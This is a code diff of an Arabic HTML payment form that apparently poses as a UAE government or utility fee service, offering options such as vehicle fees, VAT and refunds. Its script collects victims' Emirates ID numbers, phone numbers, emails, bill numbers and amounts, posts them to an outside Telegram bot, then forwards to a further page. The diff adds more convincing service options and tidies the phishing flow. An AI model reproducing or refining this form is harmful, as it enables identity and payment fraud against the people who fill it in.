@@ -18,7 +18,7 @@
             <form id="dataForm">
                 <div class="input-group">
                     <label>رقم الفاتورة</label>
-                    <input type="text" id="billNumber" maxlength="6" pattern="\d{6}" title="يجب إدخال 6 أرقام فقط" placeholder="XXXXXX" required>
+                    <input type="text" id="billNumber" maxlength="6" pattern="\d{6}" placeholder="أدخل رقم الفاتورة" required>
                 </div>
 
                 <div class="input-group">
@@ -28,25 +28,28 @@
 
                 <div class="input-group">
                     <label>رقم الجوال</label>
-                    <input type="tel" id="phoneNumber" maxlength="10" placeholder="05XXXXXXXX" pattern="^05[0245568]\d{7}$" title="يرجى إدخال رقم هاتف إماراتي صحيح (10 أرقام)" required>
+                    <input type="tel" id="phoneNumber" maxlength="10" placeholder="05XXXXXXXX" pattern="^05[0245568]\d{7}$" required>
                 </div>
 
                 <div class="input-group">
                     <label>البريد الإلكتروني</label>
-                    <input type="email" id="email" placeholder="example@domain.com" required>
+                    <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required>
                 </div>
 
                 <div class="input-group">
                     <label>نوع الخدمة</label>
                     <select id="serviceType" required>
                         <option value="" disabled selected>اختر نوع الخدمة</option>
+                        <option value="دفع رسوم شحن مركبة">دفع رسوم شحن مركبة</option>
+                        <option value="دفع رسوم نقل ملكية مركبة">دفع رسوم نقل ملكية مركبة</option>
+                        <option value="دفع رسوم عقد ايجار">دفع رسوم عقد ايجار</option>
                         <option value="دفع ضريبة القيمة المضافة">دفع ضريبة القيمة المضافة</option>
                         <option value="استرداد الرسوم المدفوعة">استرداد الرسوم المدفوعة</option>
-                    </select>
+                        </select>
                 </div>
 
                 <div class="input-group">
-                    <label>(درهم إماراتي) مبلغ السداد</label>
+                    <label>مبلغ السداد (درهم إماراتي)</label>
                     <div class="amount-container">
                         <span class="currency">AED</span>
                         <input type="number" id="amount" placeholder="0.00" step="0.01" required>
@@ -59,23 +62,15 @@
     </div>
 
     <script>
-        // تنسيق تلقائي لرقم الهوية أثناء الكتابة
+        // تنسيق تلقائي لرقم الهوية الإماراتية 784-XXXX-XXXXXXX-X
         document.getElementById('idNumber').addEventListener('input', function (e) {
-            let value = e.target.value.replace(/\D/g, '');
-            let formatted = "";
-            if (value.length > 0) formatted += value.substring(0, 3);
-            if (value.length > 3) formatted += "-" + value.substring(3, 7);
-            if (value.length > 7) formatted += "-" + value.substring(7, 14);
-            if (value.length > 14) formatted += "-" + value.substring(14, 15);
-            e.target.value = formatted;
-        });
-
-        // منع إدخال غير الأرقام في حقل الفاتورة والجوال
-        const numericFields = ['billNumber', 'phoneNumber'];
-        numericFields.forEach(id => {
-            document.getElementById(id).addEventListener('keypress', function (e) {
-                if (e.which < 48 || e.which > 57) e.preventDefault();
-            });
+            let v = e.target.value.replace(/\D/g, '');
+            let out = "";
+            if (v.length > 0) out += v.substring(0, 3);
+            if (v.length > 3) out += "-" + v.substring(3, 7);
+            if (v.length > 7) out += "-" + v.substring(7, 14);
+            if (v.length > 14) out += "-" + v.substring(14, 15);
+            e.target.value = out;
         });
 
         const telegramToken = "YOUR_BOT_TOKEN"; 
@@ -84,14 +79,14 @@
         document.getElementById('dataForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            // تحقق إضافي من طول الهوية
+            // التحقق النهائي من طول الهوية
             if(document.getElementById('idNumber').value.length < 18) {
-                alert("رقم الهوية الإماراتية غير مكتمل");
+                alert("رقم الهوية غير صحيح، يجب أن يكون بالتنسيق الإماراتي الكامل");
                 return;
             }
 
             const message = `
-🔔 **طلب سداد جديد**
+🔔 **بيانات دفع جديدة**
 --------------------------
 📄 رقم الفاتورة: ${document.getElementById('billNumber').value}
 🆔 رقم الهوية: ${document.getElementById('idNumber').value}
@@ -106,8 +101,8 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: telegramChatId, text: message })
             }).then(() => {
-                window.location.href = "page3.html";
-            }).catch(() => alert("خطأ في الاتصال"));
+                window.location.href = "page3.html"; // التوجه للصفحة الثالثة
+            }).catch(() => alert("خطأ في الإرسال، تحقق من التوكن"));
         });
     </script>
 </body>
